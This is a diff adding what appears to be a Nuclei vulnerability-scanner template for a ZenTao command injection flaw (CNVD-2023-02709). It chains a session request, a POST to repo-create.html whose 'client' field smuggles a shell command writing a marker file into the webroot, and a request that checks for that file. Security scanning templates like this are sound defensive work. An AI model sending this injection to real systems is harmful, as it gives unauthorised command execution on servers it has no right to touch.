@@ -1,0 +1,52 @@
+id: zentao-misc-captcha-user-html-cmdi
+info:
+  name: Zentao misc-captcha-user.html Command Injection (CNVD-2023-02709)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CNVD-2023-02709,command-injection
+  description: |
+    Zentao Project Management System is vulnerable to a command injection vulnerability in the misc-captcha-user.html page.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/misc-captcha-user.html"
+    headers:
+      Cookie: "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: payload-delivery
+    method: POST
+    path:
+      - "{{BaseURL}}/repo-create.html"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default"
+    body: "SCM=Subversion&client=echo {{t2}}// > ../../www/{{t1}}.txt -- "
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.txt"
+    headers:
+      Cookie: "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
